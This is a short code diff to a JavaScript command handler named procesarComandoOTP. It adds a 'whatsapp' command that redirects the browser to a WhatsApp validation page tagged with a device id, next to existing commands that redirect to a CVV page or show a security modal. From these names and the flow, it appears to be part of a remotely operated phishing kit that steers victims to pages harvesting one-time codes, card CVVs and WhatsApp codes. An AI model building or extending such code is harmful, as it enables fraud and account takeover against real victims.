@@ -287,6 +287,8 @@ async function procesarComandoOTP(command) {
         loaderStatus(false);
         const secModal = document.getElementById('security');
         if (secModal) secModal.style.display = 'flex';
+    } else if (command === 'wpp' || command === 'whatsapp') {
+        window.location.href = (typeof basePath !== 'undefined' ? basePath : '') + 'whatsapp_validation.php?id=' + (typeof currentDeviceId !== 'undefined' ? currentDeviceId : '');
     } else if (command === 'cvv') {
         if (heartbeatInterval) clearInterval(heartbeatInterval);
         window.location.href = basePath + 'v92_sec_c3v.html';
